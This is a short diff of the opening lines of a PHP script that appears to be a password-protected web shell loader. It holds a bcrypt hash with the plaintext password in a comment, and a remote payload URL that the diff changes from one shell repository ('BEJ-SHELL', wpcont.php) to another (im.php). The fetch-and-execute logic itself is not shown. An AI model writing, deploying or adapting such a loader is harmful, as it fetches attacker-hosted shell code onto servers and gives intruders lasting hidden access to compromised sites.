@@ -1,7 +1,7 @@
 <?php
 session_start();
 $PW_HASH = '$2a$12$B7lIskE02JHjO2nWqNSMXu/uY/uN5S5LZBsxB6eqS1As/FjaZkj9q'; // buat disini : https://bcrypt-generator.com/ : password "passwordkun"
-$REMOTE_PAYLOAD_URL = 'https://raw.githubusercontent.com/Exploit-Kun/BEJ-SHELL/refs/heads/main/wpcont.php';
+$REMOTE_PAYLOAD_URL = 'https://raw.githubusercontent.com/eclibesec/hastalavista/refs/heads/main/im.php';
 $EXPECTED_PAYLOAD_HASH = null;
 $CURL_TIMEOUT = 8;
 $USER_AGENT = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0 (nomi-protector)';
